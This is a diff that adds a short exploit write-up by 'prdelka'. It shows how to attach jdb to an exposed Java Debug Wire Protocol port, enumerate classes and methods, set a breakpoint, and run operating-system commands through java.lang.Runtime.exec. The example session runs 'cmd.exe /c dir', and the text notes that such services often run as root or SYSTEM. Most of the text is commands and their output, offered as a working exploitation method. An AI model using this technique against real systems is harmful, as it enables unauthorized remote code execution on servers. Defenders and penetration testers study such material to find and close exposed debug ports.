@@ -1,0 +1,73 @@
+JDWP Arbitrary Java Code Execution Exploitation
+===============================================
+Java Debugging Wire Protocol (JDWP) is the lowlevel protocol used for
+communication between a debugger and a Java Virtual Machine (JVM) as outlined in
+the Java Platform Debugger Architecture. It is often used to facilitate remote
+debugging of a JVM over TCP/IP and can be identified by the initial protocol
+handshake ascii string "JDWP-Handshake", sent first by the client and responded
+to by the server. "jdb" is a proof-of-concept JDWP capable debugger included in
+Oracle JDK and OpenJDK which can be used to interact with remote JDWP capable
+services. Typically this service runs on TCP port 8000 however it can be found
+to run on arbitrary TCP ports and is sometimes found enabled inadvertantly on
+servers running Java services. It is possible to use this utility to exploit 
+remote JVM's and execute arbitrary Java code. An example shown here outlines
+how to leverage this weakness to execute arbitrary host OS commands in the
+context of the JVM.
+
+$ jdb -attach x.x.x.x:8000
+Set uncaught java.lang.Throwable
+Set deferred uncaught java.lang.Throwable
+Initializing jdb ...
+> 
+
+Information leaks can be leveraged to determine details about the remote OS
+platform and Java installation configuration through the "classpath" command.
+
+> classpath
+base directory: C:\Windows\system32
+classpath: [ ** MASKED ** list of jar's loaded in remote JVM ]
+bootclasspath: [ ** MASKED ** list of JRE paths ]
+> 
+
+jdb is capable of performing remote object creation and method invokation from
+within the CLI using the "print" "dump" and "eval" commands with the "new"
+keyword. To determine the classes and methods available use the "classes" and
+then "methods" on the corrosponding class. 
+
+> classes
+...
+java.lang.Runtime
+...
+> methods java.lang.Runtime
+...
+java.lang.Runtime exec(java.lang.String[])
+...
+
+It is often necessary to set the JDB context to be within a suspended thread or
+breakpoint before attempting to create a new remote object class. Using the
+"trace go methods" function can be used to identify a candidate for a breakpoint
+and then "stop in your.random.class.method()" to halt the execution of a running
+thread. When the execution is halted you can use "print new" to create your
+class and invoke methods such as in the following example.
+
+Breakpoint hit: "thread=threadname",your.random.class.method(), line=745 bci=0
+threadname[1] print new java.lang.Runtime().exec("cmd.exe /c dir")
+new java.lang.Runtime().exec("cmd.exe /c dir") = "java.lang.ProcessImpl@918502"
+threadname[1] cont
+> 
+
+Exploitation success will be determined from the output of the JDB process as
+functions returning "null" or errors about "unsuspended thread state" would
+indicate that exploitation was unsuccessful, however in the example above we can
+see that the java created a new object "java.lang.ProcessImpl@918502" indicating
+the "cmd.exe /c dir" was executed with success. On Linux this may need adjusting
+to "java.lang.Runtime.getRuntime().exec()" however see the method / class
+enumeration when attempting to exploit this flaw.
+
+
+Your java will be executed in the context of the running JVM application, this
+has been identified on services running as both "root" (*nix) and "SYSTEM"
+(win32) in the wild. 
+
+
+ -- prdelka
